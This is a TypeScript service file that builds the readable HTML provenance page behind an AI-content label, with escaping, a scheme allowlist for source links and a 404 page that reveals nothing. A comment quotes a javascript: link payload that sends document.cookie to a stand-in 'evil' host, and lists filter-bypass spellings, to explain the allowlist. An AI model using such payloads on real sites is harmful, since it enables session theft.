/**
 * @file src/services/ai-provenance-page.ts
 * @author Jouni Miikki
 * SPDX-License-Identifier: MIT
 * @description The READABLE provenance record — the page a person lands on after clicking the
 *   "How this was made" link on a visible AI label.
 *
 *   WHY THIS EXISTS. The visible chip's second layer pointed at `/v1/provenance/{id}`, which
 *   answered `application/json` to everyone, browsers included. The route's own comment says a
 *   person arrives here ("this is the one page where somebody who thinks a label is wrong or
 *   missing already has the identifier in front of them"), and the correction procedure it offers
 *   lived in `next_actions` — invisible to exactly the reader it exists for. So the compliance
 *   label answered a member of the public with a JSON dump.
 *
 *   CONTENT NEGOTIATION, NOT A NEW CHIP. The alternative was a dialog inside the injected label, and
 *   that label runs as foreign script inside somebody else's single-file app on an isolated origin —
 *   its three lines are deliberately minimal. Negotiating here fixes every app on the node at once
 *   and touches no app.
 *
 *   THE WORDING IS THE RECORD'S OWN. `disclosure.short` and `.long` are rendered in every locale,
 *   at mint and again when the route decides the disclosure for this reader's surface, so the page
 *   says exactly what the chip said. Writing fresh sentences here would create a second source of
 *   truth for a compliance statement, and the two would drift. The page's own chrome and the
 *   readable names of the record's values are `aiLabel.page.*` in the locale files.
 *
 *   WHAT IS DELIBERATELY NOT HERE: any field the JSON would not have served to the same caller. The
 *   route decides `isOwner` and projects the record BEFORE calling this; a page that reached past
 *   that projection would widen a disclosure boundary in the one format nobody diffs.
 * @structure
 *   - provenancePage(record, opts) — the full HTML document
 * @usage
 *   if (prefersHtmlPage(req)) return res.type('html').send(provenancePage(serve(row, isOwner), {...}));
 * @version-history
 *   v1.1.0 — 2026-10-08 — The copy moved into the locale files (`aiLabel.page.*`), Spanish added; the
 *     level, method, human involvement and the new medium row show a readable name beside the
 *     token; a record that owes no label says so instead of printing the chip's words. The Finnish
 *     copy no longer says "solmu".
 *   v1.0.1 — 2026-10-05 — HTML is escaped with escapeHtml (utils/html-escape.ts), which escapes all five characters (secaudit 2026-10, C8).
 *   v1.0.0 — 2026-08-02 — Initial. LUOTAIN finding: the label's second layer was machine-only.
 */
import type { AiProvenance } from '../models/ai-provenance-schemas.js';
import { createT, type Locale } from '../i18n.js';
import { escapeHtml } from '../utils/html-escape.js';

export interface ProvenancePageOptions {
  /** The node's apex, for the links out. */
  baseUrl: string;
  /** Reader language, from Accept-Language. Every language the node ships is rendered. */
  locale: Locale;
  /** The record's addressable URL, shown so a reader can cite or re-fetch it. */
  recordUrl: string;
}

const esc = escapeHtml;

/**
 * The escaped href for a caller-supplied URL, or `null` when its SCHEME is not one we will link.
 *
 * esc() stops a value breaking OUT of the attribute; it says nothing about what the attribute then
 * means. `javascript:fetch("https://evil/"+document.cookie)` survives escaping intact and becomes a
 * working link — and this page is served from the apex, where the session cookie lives, from a link
 * the platform actively tells people to click inside somebody else's app. Escaping and scheme are
 * two different jobs, and this is the second one.
 *
 * ALLOWLIST, NEVER A BLOCKLIST. No stripping of "javascript:" and keeping the rest: that is a
 * rewrite-the-attacker's-string game, and it is lost by `java\tscript:`, `JaVaScRiPt:`, a leading
 * newline, or the next encoding nobody thought of. Two schemes are permitted and everything else —
 * including `data:` and anything relative that could resolve oddly — is simply not a link.
 *
 * The caller renders a refusal as TEXT rather than dropping it: see the call site. A page that
 * quietly hides part of what a record says fails the same way as one that renders it dangerously.
 */
export function safeHref(url: unknown): string | null {
  if (typeof url !== 'string') return null;
  const raw = url.trim();
  // canParse rather than try/catch: an unparseable address is an ANSWER here ("not a link"), not a
  // failure to swallow, and saying so without a catch keeps that distinction visible.
  if (!URL.canParse(raw)) return null;
  const parsed = new URL(raw);
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null;
  return esc(parsed.href);
}

/**
 * The page's copy, `aiLabel.page.*` in the locale files. Only the CHROME and the readable names of
 * the record's enum values live there; every statement of fact comes off the record.
 */
function copyFor(locale: Locale): (key: string) => string {
  const t = createT(locale);
  return (key) => t(`aiLabel.page.${key}`);
}

/** `ai-generated` → `aiGenerated`: the locale files key the enum values in camelCase. */
const camel = (token: string): string => token.replace(/-([a-z])/g, (_m, c: string) => c.toUpperCase());

/**
 * A readable name for an enum value, with the value itself beside it in code type, so a reader
 * sees what the sentence means and a fact-checker can still quote the token the record carries.
 */
function enumCell(t: (key: string) => string, group: string, token: string | undefined): string {
  if (!token) return '';
  const key = `${group}.${camel(token)}`;
  const name = t(key);
  // An unknown value (a newer node's vocabulary) shows as the token alone.
  return name === `aiLabel.page.${key}` ? `<code>${esc(token)}</code>` : `${esc(name)} <code>${esc(token)}</code>`;
}

const STYLE = `
:root{color-scheme:light dark;--fg:#14151a;--dim:#5b6070;--line:#dfe2ea;--bg:#fbfbfd;--card:#fff;--accent:#8b2500}
@media (prefers-color-scheme:dark){:root{--fg:#e8e9ee;--dim:#9aa0b0;--line:#2c2f3a;--bg:#14151a;--card:#1b1d25;--accent:#ff8a66}}
*{box-sizing:border-box}
body{margin:0;padding:2rem 1rem 4rem;background:var(--bg);color:var(--fg);
 font:400 16px/1.6 system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
main{max-width:44rem;margin:0 auto}
h1{font-size:1.5rem;margin:0 0 .25rem}
.lede{font-size:1.05rem;margin:0 0 1.75rem}
h2{font-size:1rem;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);
 margin:2rem 0 .6rem;font-weight:600}
.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:1rem 1.15rem}
dl{margin:0;display:grid;grid-template-columns:minmax(9rem,auto) 1fr;gap:.45rem 1rem}
dt{color:var(--dim)}
dd{margin:0;overflow-wrap:anywhere}
code{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:.9em}
ol{margin:.3rem 0 0;padding-left:1.2rem}
li{margin-bottom:.3rem;overflow-wrap:anywhere}
a{color:var(--accent)}
.badhref{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:.85em;color:var(--dim);
 word-break:break-all}
.note{color:var(--dim);font-size:.9rem;margin:.6rem 0 0}
.actions{display:flex;flex-wrap:wrap;gap:.75rem;margin-top:.75rem}
@media (max-width:32rem){dl{grid-template-columns:1fr;gap:.15rem}dt{margin-top:.5rem}}
`;

function row(dt: string, dd: string | undefined | null): string {
  if (!dd) return '';
  return `<dt>${esc(dt)}</dt><dd>${dd}</dd>`;
}

/**
 * The 404 page — ONE page for "no such record", "not yours" and "its content is not public".
 *
 * The JSON branch collapses those three into one identical body so the endpoint cannot be used as
 * an oracle for which ids exist on this node. The HTML branch has to be exactly as uninformative,
 * or adding a readable page would reopen what that code closed. It therefore takes NO argument
 * about the record: there is nothing it could differ on.
 */
export function provenanceNotFoundPage(opts: { baseUrl: string; locale: Locale }): string {
  const t = copyFor(opts.locale);
  const lang = opts.locale;
  const base = opts.baseUrl.replace(/\/+$/, '');
  return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>${esc(t('gone'))}</title>
<meta name="robots" content="noindex">
<style>${STYLE}</style>
</head>
<body>
<main>
<h1>${esc(t('gone'))}</h1>
<p class="lede">${esc(t('goneBody'))}</p>
<div class="card"><div class="actions">
<a href="${esc(base)}/v1/ai-transparency">${esc(t('howNode'))}</a>
</div></div>
</main>
</body>
</html>`;
}

/**
 * The page. `record` is ALREADY projected for the caller — pass exactly what the JSON branch would
 * have served, never the raw row.
 */
export function provenancePage(record: AiProvenance, opts: ProvenancePageOptions): string {
  const t = copyFor(opts.locale);
  const lang = opts.locale;
  const base = opts.baseUrl.replace(/\/+$/, '');
  const d = record.disclosure;
  const g = record.generator;

  // The chip's own sentence, in the reader's language, with the record's fallbacks. When no label
  // is owed there is no chip, and the page says so instead of printing a label nobody is shown.
  // The disclosure here was decided for this reader's surface by the route (servedDisclosure).
  const short = d?.short?.[lang] ?? d?.short?.en ?? '';
  const long = d?.long?.[lang] ?? d?.long?.en ?? '';
  const lede = !d?.required ? t('noneOwed') : [short, long].filter(Boolean).join('. ');

  const sources = (record.sources ?? []).filter(s => s?.url);
  const stamped = record.attestation?.stampedBy === 'node' ? t('stampedNode')
    : record.attestation?.stampedBy === 'principal' ? t('stampedPrincipal') : null;
  const medium = record.mediaKind
    ? `${enumCell(t, 'media', record.mediaKind)}${record.mediaType ? ` · <code>${esc(record.mediaType)}</code>` : ''}`
    : '';

  return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>${esc(t('title'))}</title>
<meta name="robots" content="noindex">
<link rel="alternate" type="application/json" href="${esc(opts.recordUrl)}">
<style>${STYLE}</style>
</head>
<body>
<main>
<h1>${esc(t('title'))}</h1>
<p class="lede">${esc(lede)}</p>

<h2>${esc(t('fields'))}</h2>
<div class="card"><dl>
${row(t('level'), enumCell(t, 'levels', record.level))}
${row(t('medium'), medium)}
${row(t('method'), enumCell(t, 'methods', record.method))}
${row(t('human'), enumCell(t, 'involvement', record.humanInvolvement))}
${row(t('model'), g?.model ? `<code>${esc(g.model)}</code>` : '')}
${row(t('provider'), g?.provider ? esc(g.provider) : '')}
${row(t('pipeline'), g?.pipeline ? `<code>${esc(g.pipeline)}</code>` : '')}
${row(t('principal'), g?.principal ? `<code>${esc(g.principal)}</code>` : '')}
${row(t('generatedAt'), record.generatedAt ? esc(record.generatedAt) : '')}
${row(t('stampedBy'), stamped ? esc(stamped) : '')}
</dl></div>

${sources.length ? `<h2>${esc(t('sources'))}</h2>
<div class="card"><ol>
${sources.map(s => {
  const href = safeHref(s.url);
  const when = s.retrievedAt ? ` <span class="note">(${esc(String(s.retrievedAt).slice(0, 10))})</span>` : '';
  // A scheme we will not link is shown VERBATIM as text — the reader sees exactly what the record
  // declared, and can judge it, which is the whole point of publishing the record. The address is
  // shown rather than the title here on purpose: a title is the attacker's string too, and behind a
  // dead link it would be the only thing on screen.
  if (!href) return `<li><span class="badhref">${esc(s.url)}</span>${when}</li>`;
  return `<li><a href="${href}" rel="noopener noreferrer nofollow" target="_blank">${esc(s.title || s.url)}</a>${when}</li>`;
}).join('\n')}
</ol></div>` : ''}

${record.attestation?.contentHash ? `<h2>${esc(t('hash'))}</h2>
<div class="card"><code>${esc(record.attestation.contentHash)}</code>
<p class="note">${esc(t('hashNote'))}</p></div>` : ''}

${record.notes ? `<div class="card" style="margin-top:1rem"><p class="note" style="margin:0">${esc(record.notes)}</p></div>` : ''}

<h2>${esc(t('wrongTitle'))}</h2>
<div class="card">
<p style="margin:0">${esc(t('wrongBody'))}</p>
<p class="note">${esc(t('recordId'))}: <code>${esc(opts.recordUrl.split('/').pop() ?? '')}</code></p>
<div class="actions">
<a href="${esc(base)}/v1/ai-transparency">${esc(t('howNode'))}</a>
<a href="${esc(base)}/v1/docs#post-v1flags">${esc(t('reportBtn'))}</a>
<a href="${esc(opts.recordUrl)}">${esc(t('machine'))}</a>
</div>
</div>
</main>
</body>
</html>`;
}
